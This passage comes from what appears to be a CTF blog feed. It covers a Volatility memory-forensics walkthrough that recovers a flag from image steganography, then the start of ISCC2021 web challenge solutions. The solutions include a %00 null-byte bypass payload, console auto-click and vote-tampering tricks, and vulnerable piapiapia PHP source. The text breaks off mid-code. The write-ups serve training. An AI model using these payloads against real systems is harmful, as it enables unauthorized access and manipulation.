flag<br>flag.jpg<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.png<br>flag.png<br>flag.jpg<br>flag.jpg<br>flag.png<br>flag.lnk<br>flag.jpg<br>\flag.jpg*C:\Documents and Settings\Administrator\<br>flag.png<br>flag.jpg<br>flag.lnk<br>notiflag.exe<br>\Documents and Settings\Administrator\Recent\flag.lnk<br>flag.png<br>flag.jpg<br>flag.png<br>flag.png<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.lnk<br>flag.jpg<br>flag.png<br>\flag.jpg<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br> 1\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>flag.png<br>flag.lnk<br>flag.png<br>\flag.jpg.jpg<br>\flag.png<br> 1\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.jpg<br>\flag.jpg<br>flag.jpg<br>\flag.jpg<br>\flag.jpg<br>\Device\HarddiskVolume1\Documents and Settings\Administrator\Recent\flag.lnk<br>\flag.png<br> 1\flag.png<br>\flag.jpg<br>\flag.png<br>flag.png<br>flag.jpg<br>usbflags<br>usbflags<br>usbflags<br>usbflags\vvvvpppprrrr<br>usbflags<br></code></pre></td></tr></table></figure><p>可疑文件flag.jpg和flag.png</p><p>5.获取浏览器浏览历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 iehistory<br>Volatility Foundation Volatility Framework 2.6<br></code></pre></td></tr></table></figure><p>在大师傅博客里面能看到hint.txt，但我这里啥也没有，继续往下看吧</p><p>6.扫描并提取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep hint<br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002456028      1      0 RW-r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>7.使用dumpfiles提取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002456028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02456028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\My Documents\hint.txt<br></code></pre></td></tr></table></figure><p>得到file.None.0x821231b8.dat<br><img src="https://img-blog.csdnimg.cn/20210603204442392.png" alt="在这里插入图片描述"><br>修改后缀为txt，hint提示文件名为fl4g</p><p>8.扫描查找fl4g文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 filescan | grep fl4g                 <br>Volatility Foundation Volatility Framework 2.6<br>0x0000000002052028      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure><p>9.把fl4g文件dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002052028 -D ./<br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x02052028   None   \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\fl4g.zip<br></code></pre></td></tr></table></figure><p>修改后缀为zip，解压出来flag.png和flag.jpg</p><p>10.LSB双图隐写<br>先用StegSlove打开flag.png，然后点击Analyse-&gt;Image Combiner打开flag.jpg，进行异或会得到二维码<br><img src="https://img-blog.csdnimg.cn/20210603205142989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>11.扫码解flag</p><p>二维码信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://fanyi.baidu.com/translate?aldtype=16047&amp;query=%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7&amp;keyfrom=baidu&amp;smartresult=dict&amp;lang=auto2zh<span class="hljs-comment">#zh/en/%E6%B0%9F%E5%BE%95%E6%A0%BC%E4%B9%83%E9%8C%B5%E6%89%A9%E5%8F%B7%E6%AC%B8%E5%BF%85%E8%A5%BF%E5%BC%9F%E4%BA%BF%E8%89%BE%E8%99%8E%E9%94%AF%E9%8C%B5%E6%89%A9%E5%8F%B7</span><br></code></pre></td></tr></table></figure><p>根据读音最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;abcdefg&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装Volatility&quot;&gt;&lt;a href=&quot;#安装Volatility&quot; class=&quot;headerlink&quot; title=&quot;安装Volatility&quot;&gt;&lt;/a&gt;安装Volatility&lt;/h2&gt;&lt;p&gt;新版kali不自带Volatility，需要自己安装源码编译</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="MISC" scheme="http://atkx.top/categories/CTF/MISC/"/>
    
    
    <category term="流量分析" scheme="http://atkx.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 Web WP</title>
    <link href="http://atkx.top/2021/05/27/ISCC2021-Web-WP/"/>
    <id>http://atkx.top/2021/05/27/ISCC2021-Web-WP/</id>
    <published>2021-05-27T12:26:07.000Z</published>
    <updated>2021-08-15T03:59:06.654Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><blockquote><p>又到了一年一度的ISCC，客服一号为了保住饭碗（被迫）参与了今年的客服海选投票。经过激烈的角逐，客服一号终于凭借着自己多年的客服经验来到决赛的舞台，却发现对手竟是自己？？？<br>请帮助真正的客服一号在投票中取胜，保住客服一号的饭碗！ 题目入口：<a href="http://39.96.91.106:7020/">http://39.96.91.106:7020</a></p></blockquote><p><strong>方法一</strong>：使用连点器<br>设置每秒点击100次，得到flag<br><img src="https://img-blog.csdnimg.cn/20210501144653201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法二</strong>：修改按钮ID<br>F12将两个按钮的id交换<img src="https://img-blog.csdnimg.cn/20210505160357289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法三</strong>：<br>js调用click函数，控制台输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;left_button&quot;</span>).click();&#125;,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>方法四</strong>：刷票</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">local_left_votes=<span class="hljs-number">999999</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210505162648614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><blockquote><p>这是什么东西呢？<br>题目入口：<a href="http://39.96.91.106:7030/">http://39.96.91.106:7030</a></p></blockquote><p>下载附件，将jsfuck编码丢到控制台得到flag<br><img src="https://img-blog.csdnimg.cn/20210501112110324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="正则匹配最后的倔强。"><a href="#正则匹配最后的倔强。" class="headerlink" title="正则匹配最后的倔强。"></a>正则匹配最后的倔强。</h2><p>按照提示访问robots.txt，不允许所有人访问/src/code/code.txt<br><img src="https://img-blog.csdnimg.cn/20210502115331384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问/code/code.txt得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br><span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br><br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;    <br>    <br><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Bugku原题，传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”-“才能输出flag。可以使用%00来截断，当ereg函数读到 %00的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p>flag：<br><img src="https://img-blog.csdnimg.cn/20210502115236778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="ISCC{1SCc-202i}"></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><blockquote><p>登录来上传自己的信息吧！<br>题目入口：<a href="http://39.96.91.106:7010/">http://39.96.91.106:7010</a></p></blockquote><p>这是一道原题： [0CTF 2016] piapiapia,参考<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia">wp</a><br><img src="https://img-blog.csdnimg.cn/20210504124735854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><a href="http://www.zip源码泄露,可直接下载源码./">www.zip源码泄露，可直接下载源码。</a><br><img src="https://img-blog.csdnimg.cn/20210501145644459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码如下：</p><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p> register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span 